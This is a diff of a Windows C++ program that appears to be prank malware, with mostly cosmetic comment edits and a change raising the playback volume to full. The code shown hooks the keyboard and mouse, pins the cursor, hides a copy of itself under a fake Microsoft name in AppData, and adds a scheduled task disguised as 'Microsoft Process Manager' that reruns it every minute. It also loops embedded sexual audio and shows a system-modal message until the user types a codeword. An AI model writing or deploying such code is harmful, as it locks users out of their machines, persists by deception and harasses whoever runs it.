@@ -1,4 +1,4 @@
-#include "stdafx.h" //precompiled headers
+#include "stdafx.h" //Pre-compiled headers
 
 #include "resource.h"
 #pragma comment(lib, "winmm.lib")
@@ -7,7 +7,7 @@ HHOOK hMouseHook = NULL;
 HHOOK hKeyboardHook = NULL;
 bool running = false;
 
-// freeze mouse position
+// Freeze mouse position
 static LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (nCode >= 0 && wParam == WM_MOUSEMOVE) {
 		SetCursorPos(0, 0);
@@ -15,7 +15,7 @@ static LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lPara
 	}
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
-// end execution when the user writes "daddy"
+// End execution when the user writes "daddy"
 static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (nCode == HC_ACTION) {
 		KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
@@ -68,7 +68,7 @@ static wchar_t* GetAppDataFolder() {
 
 	return path;
 }
-// creates a task that runs "file" every minute
+// Creates a task that runs "file" every minute
 static void createTask(wchar_t* file) {
 	std::wstring cmd = L"schtasks /create /tn \"Microsoft Process Manager\" /sc minute /mo 1 /tr \"";
 	(cmd += file) += L"\"";
@@ -87,7 +87,7 @@ static void createTask(wchar_t* file) {
 		&pi                       // Process info
 	);
 }
-// moves exe to appdata directory
+// Moves exe to appdata directory
 static wchar_t* moveSelf() {
 	wchar_t filePath[MAX_PATH + 1]{};
 	auto newPath = lstrcatW(GetAppDataFolder(), L"\\Microsoft\\Windows\\procmgr.exe");
@@ -96,8 +96,9 @@ static wchar_t* moveSelf() {
 	SetFileAttributesW(newPath, FILE_ATTRIBUTE_HIDDEN);
 	return newPath;
 }
+// Gets a resource from the program as bytes
 
-static std::vector<BYTE> getResource(int resourceID, const wchar_t* resourceType) { // gets a resource from the exe
+static std::vector<BYTE> getResource(int resourceID, const wchar_t* resourceType) {
 	HRSRC hRes = FindResourceW(NULL, MAKEINTRESOURCE(resourceID), resourceType);
 	if (!hRes) exit(1);
 	HGLOBAL hData = LoadResource(NULL, hRes);
@@ -107,8 +108,7 @@ static std::vector<BYTE> getResource(int resourceID, const wchar_t* resourceType
 
 	return std::vector<BYTE>((BYTE*)pData, (BYTE*)pData + size);
 }
-// set master volume and muted
-
+// Set master volume and muted
 static int setVolume(const float& vol, const BOOL muted, const bool& loop = false) {
 	if (vol < 0.0f || vol > 1.0f) return EXIT_FAILURE;
 	HRESULT hr;
@@ -170,7 +170,7 @@ int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
 	const auto waveData = getResource(IDR_WAVE1, L"WAVE"); //moaning.wav
 	playData(waveData, true);
 	running = true;
-	std::thread t(setVolume, .5f, FALSE, true);
+	std::thread t(setVolume, 1.0f, FALSE, true);
 	StartKeyboardHook();
 	StartMouseHook();
 	std::thread([] { MessageBoxW(NULL, L"call me daddy", L":3", MB_OK | MB_SYSTEMMODAL); }).detach();
